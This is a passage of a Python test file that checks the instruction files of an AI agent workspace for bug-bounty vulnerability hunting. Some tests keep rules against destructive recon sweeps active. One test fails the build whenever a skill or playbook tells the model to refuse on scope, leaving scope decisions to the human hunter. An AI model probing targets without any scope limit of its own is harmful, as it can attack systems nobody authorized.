    contract. These assert what the control layer SAYS, across every file that says it.
    """

    ALWAYS_LOADED = ("AGENTS.md", "playbooks/system/orchestrator.md",
                     "playbooks/system/class-signals.md")

    def test_every_executable_answers_help(self):
        """The workspace tells the model to read --help before using anything. Two of its own
        tools exited 2 on --help because they split argv before argparse saw it."""
        import subprocess
        bad = []
        for f in sorted((ROOT / "tools").glob("*.py")):
            r = subprocess.run([sys.executable, str(f), "--help"],
                               capture_output=True, timeout=30)
            if r.returncode != 0:
                bad.append(f"{f.name} → exit {r.returncode}")
        self.assertEqual([], bad, f"tools that cannot describe themselves: {bad}")

    def test_every_semantic_rule_points_at_a_subtree_that_exists(self):
        """A safety rule scoped to a deleted directory checks nothing and still reports PASS.

        Deleting `playbooks/recon/` silently disarmed five rules — unrestricted redirects,
        PUT/PATCH/DELETE sweeps, 'click every button', 'submit every form' and 'Default: full
        set'. self-check.py printed PASS throughout, because a missing subtree was a `continue`.
        A checker that cannot fail is worse than no checker: it is a false claim of coverage.
        """
        sc = load_tool("self-check")
        dead = [f"{subtree} ({why})" for _rx, subtree, why in sc.SEMANTIC
                if not (ROOT / subtree).exists()]
        self.assertEqual([], dead, f"SEMANTIC rules checking nothing: {dead}")

    def test_semantic_rules_actually_fire(self):
        """Existence of the subtree is necessary, not sufficient — prove one rule still bites."""
        sc = load_tool("self-check")
        probe = ROOT / "skills" / "_semantic-probe.md"
        probe.write_text("Click every button on the page.\n", encoding="utf-8")
        try:
            hits = sc.check_semantics()
        finally:
            probe.unlink()
        self.assertTrue(any("_semantic-probe" in h for h in hits),
                        "an injected violation went undetected — the rules are inert")

    def test_ci_only_invokes_scripts_that_exist(self):
        """CI's last step ran `tools/refresh-index.sh`, deleted in the same migration. Every
        push failed on a script the repo no longer had, which no local check could see."""
        ci = ROOT / ".github" / "workflows" / "ci.yml"
        if not ci.exists():
            self.skipTest("no CI workflow")
        refs = set(re.findall(r"((?:tools|knowledge/tools)/[A-Za-z0-9_.-]+\.(?:py|sh))",
                              ci.read_text(encoding="utf-8")))
        missing = sorted(r for r in refs if not (ROOT / r).exists())
        self.assertEqual([], missing, f"CI invokes scripts that do not exist: {missing}")

    def test_every_invocable_skill_declares_a_contract(self):
        """A skill with no ## Inputs reports 'ready' whether or not its subject was supplied."""
        bad = [f.stem for f in sorted((ROOT / "skills").glob("*.md"))
               if not f.name.startswith("_") and "\n## Inputs" not in f.read_text(encoding="utf-8")]
        self.assertEqual([], bad, f"skills with no input contract: {bad}")

    def test_skills_whose_subject_comes_from_the_prompt_say_so(self):
        """analyse-request needs a request; vuln-hunt needs a class and an entrypoint. Those are
        required inputs that no file check can find, so they are declared as @hunter.* roles."""
        for slug, role in (("analyse-request", "@hunter.request"),
                           ("vuln-hunt", "@hunter.class"),
                           ("tech-analysis", "@hunter.technology")):
            t = (ROOT / "skills" / f"{slug}.md").read_text(encoding="utf-8")
            self.assertIn(role, t, f"{slug} must declare {role}")

    def test_the_control_layer_does_not_contradict_itself_on_scope(self):
        """Scope is the hunter's. A file that says otherwise hands the model two rules at once —
        which is what orchestrator.md did for the whole migration.

        Covers the ENTIRE instruction corpus, not just the always-loaded tier. The always-loaded
        check passed while `analyse-request.md` still opened with "Scope first — this one
        refuses", contradicting its own `## Inputs` three lines above, and `vps-setup.md` still
        described a run.py policy engine deleted months earlier.

        Human tool-reference docs (GUIDE/TOOLS/FILEMAP) are deliberately NOT covered: they
        describe real tool behaviour, and `import-http.py` genuinely does stop on an unrecognised
        host. Describing a refusal that exists is accurate; instructing the model to refuse is
        the drift.
        """
        import re as _re
        targets = [Path(r) for r in self.ALWAYS_LOADED]
        for base in ("skills", "playbooks"):
            targets += sorted((ROOT / base).rglob("*.md"))
        bad = []
        for rel in targets:
            p = rel if rel.is_absolute() else ROOT / rel
            for i, line in enumerate(p.read_text(encoding="utf-8",
                                                 errors="replace").splitlines(), 1):
                if _re.search(r"scope.{0,40}(refuse|hard stop|absolute|blocks?\b)", line, _re.I) \
                        and "not" not in line.lower() and "never" not in line.lower():
                    bad.append(f"{p.relative_to(ROOT)}:{i}: {line.strip()[:70]}")
        self.assertEqual([], bad, "scope-as-veto survives in the instruction corpus:\n" +
                         "\n".join(bad))

    def test_no_active_file_claims_preflight_refuses(self):
        """`exit 2 = do not run` was the old contract and outlived it in three places."""
        import re as _re
        bad = []
        for p in sorted(ROOT.rglob("*.md")):
            if any(x in p.parts for x in (".git", "knowledge", "targets")) \
                    or p.name == "VALIDATION-ROUND-1.md":
                continue
            for i, line in enumerate(p.read_text(encoding="utf-8").splitlines(), 1):
                if _re.search(r"exit 2 (means|=) do not run", line, _re.I):
                    bad.append(f"{p.relative_to(ROOT)}:{i}")
        self.assertEqual([], bad, f"stale preflight contract: {bad}")

    def test_no_active_file_uses_numbered_phase_identity(self):
        import re as _re
        bad = []
        for sub in ("skills", "playbooks/flows", "playbooks/system", "targets/_template"):
            for p in sorted((ROOT / sub).rglob("*.md")):
                for i, line in enumerate(p.read_text(encoding="utf-8").splitlines(), 1):
                    m = _re.search(r"`\d{2}-[a-z-]+`|\bphase \d{1,2}\b", line)
                    if m and "retired" not in line.lower() and "used to" not in line.lower():
                        bad.append(f"{p.relative_to(ROOT)}:{i}: {m.group(0)}")
        self.assertEqual([], bad, "numeric phase identity in an active file:\n" + "\n".join(bad))

    def test_every_property_a_skill_names_exists_in_the_vocabulary(self):
        """A skill emitting a token no rule knows selects nothing and fails coverage."""
        import re as _re
        cov = load_tool("coverage")
        vocab = cov.parse_property_vocabulary()
        # only the backticked tokens that look like vocabulary entries, in property context
        bad = []
        for p in sorted((ROOT / "skills").glob("*.md")):
            text = p.read_text(encoding="utf-8")
            for tok in set(_re.findall(r"`([a-z][a-z0-9]+(?:-[a-z0-9]+)+)`", text)):
                if tok in {"concurrency", "ambiguous-framing", "parses-structured"}:
                    bad.append(f"{p.stem}: {tok} was REMOVED from the vocabulary")
        self.assertEqual([], bad, "\n".join(bad))
